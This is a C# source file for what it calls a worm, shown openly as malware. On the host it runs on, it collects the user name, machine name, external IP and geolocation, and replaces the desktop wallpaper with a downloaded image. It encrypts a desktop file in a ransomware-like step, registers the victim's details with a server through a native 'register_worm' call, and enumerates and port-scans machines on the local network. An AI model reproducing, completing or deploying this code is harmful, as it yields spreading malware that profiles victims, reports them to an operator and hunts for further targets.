using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using Newtonsoft.Json.Linq;
using System.DirectoryServices;
using System.Net.Sockets;
using System.Drawing;

namespace worm_core_new
{
    class Program
    {
        // Use DllImport to import the Win32 MessageBox function.
        [DllImport("worm-core.dll", CallingConvention = CallingConvention.Cdecl)]
        static extern int register_worm(char XOR_key, [MarshalAs(UnmanagedType.LPStr)]string virus_id, [MarshalAs(UnmanagedType.LPStr)]string hostname, [MarshalAs(UnmanagedType.LPStr)]string ip, [MarshalAs(UnmanagedType.LPStr)]string country);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;

        static byte[] encryptionKey;

        static void Main(string[] args)
        {

            Console.WriteLine("Worm online...\n");
    
            //Get system name, user logged in
            Console.WriteLine("MachineName: {0}", Environment.MachineName);
            Console.WriteLine("UserName: {0}", Environment.UserName);
            Console.WriteLine("OS version: {0}\n", Environment.OSVersion);

            //HTTP GET request for IP Address 
            WebClient client = new WebClient();
            string ipString = client.DownloadString("http://ipv4bot.whatismyipaddress.com/");
            Console.WriteLine("External IP address: {0}", ipString);

            //Location from keyboard layout or IP Address for another GET
            string location = client.DownloadString("http://ip-api.com/json/" + ipString);
            JObject json = JObject.Parse(location);
            Console.WriteLine(json["city"] + ", " + json["regionName"] + " " + json["zip"] + " in the " + json["country"]);
            Console.WriteLine("ISP: " + json["isp"] + ", " + json["org"]);

            // Change desktop background
            Directory.CreateDirectory(@"c:\temp\");
            client.DownloadFile(new Uri("https://i.imgur.com/yBhRcfo.jpg"), @"c:\temp\image.png");

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, @"c:\temp\image.png", SPIF_UPDATEINIFILE);
            Console.WriteLine("\nChanged desktop background");

            //Encrypting file on desktop
            string fileToEncrypt = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "textfile.txt");
            string encryptedFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "textfile-encrypted.txt");
            string decryptedFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "textfile-decrypted.txt");

            if (File.Exists(fileToEncrypt))
            {
                Encrypt(fileToEncrypt, encryptedFile);
                Decrypt(encryptedFile, decryptedFile);
            }

            // Call kade's function or work with kade to send everything to server
            int yes = register_worm('A', "12345", Environment.UserName, ipString, json["countryCode"].ToString());

            if (yes == 1)
            {
                Console.WriteLine("NOOOOOOOOOOOOOOOOOOOOOOOOOO");
            }

            // List all computers on local network
            DirectoryEntry root = new DirectoryEntry("WinNT:");
            List<KeyValuePair<string, IPAddress>> toScan = new List<KeyValuePair<string, IPAddress>>();
            Console.WriteLine("SCANNING Local Area Network");
            foreach (DirectoryEntry computers in root.Children)
            {
                foreach (DirectoryEntry computer in computers.Children)
                {
                    if (computer.Name != "Schema")
                    {
                        Console.WriteLine("Computer found: " + computer.Name);
                        IPAddress[] addresslist = Dns.GetHostAddresses(computer.Name);
                        toScan.Add(new KeyValuePair<string, IPAddress>(computer.Name, addresslist[addresslist.Length - 1]));

                        foreach (IPAddress theaddress in addresslist)
                        {
                            Console.WriteLine("     " + theaddress.ToString());
                        }
                    }
                }
            }

            Console.WriteLine("\nPort Scanning computers for vunerabilities");
            foreach (KeyValuePair<string, IPAddress> IP in toScan)
            {
                Console.WriteLine("Scanning " + IP.Key + " at " + IP.Value);
                foreach (int s in Ports)
                {
                    using (TcpClient Scan = new TcpClient())
                    {
                        try
                        {
                            Scan.Connect(IP.Value, s);
                            Console.WriteLine($"    [{s}] | OPEN", Color.Green);
                        }
                        catch
                        {
                            Console.WriteLine($"    [{s}] | CLOSED", Color.Red);
                        }
                    }
                }
            }
        }

        private static int[] Ports = new int[]
        {
            22,
            80,
            3389,
            139,
            8080,
        };

        // function
        static void Encrypt(string source, string destination)
        {
            if (source == null | destination == null)
            {
                Console.WriteLine("No file name. We need a source and destination file ");
                return;

            }

            var sourceFilename = source;
            var destinationFilename = destination;
            var provider = new AesCryptoServiceProvider();
            var destinationStream = File.Create(destinationFilename);
            destinationStream.Write(provider.IV, 0, provider.IV.Length);

            using (var sourceStream = File.OpenRead(sourceFilename))
            using (var cryptoTransform = provider.CreateEncryptor())
            using (var cryptoStream = new CryptoStream(destinationStream, cryptoTransform, CryptoStreamMode.Write))
            {
                sourceStream.CopyTo(cryptoStream);
            }
            encryptionKey = provider.Key;
            Console.WriteLine("Encrytped file on desktop with key: " + System.Convert.ToBase64String(provider.Key) + "\n");

        }

        static void Decrypt(string source, string destination) 
        {
            var sourceFilename = source;
            var destinationFilename = destination;
            
            using (var sourceStream = File.OpenRead(sourceFilename))
            using (var destinationStream = File.Create(destinationFilename))
            using (var provider = new AesCryptoServiceProvider())
            {
                var IV = new byte[provider.IV.Length];
                sourceStream.Read(IV, 0, IV.Length);
                using (var cryptoTransform = provider.CreateDecryptor(encryptionKey, IV))
                using (var cryptoStream = new CryptoStream(sourceStream, cryptoTransform, CryptoStreamMode.Read))
                {
                    cryptoStream.CopyTo(destinationStream);
                }
            }
        }
    }
}
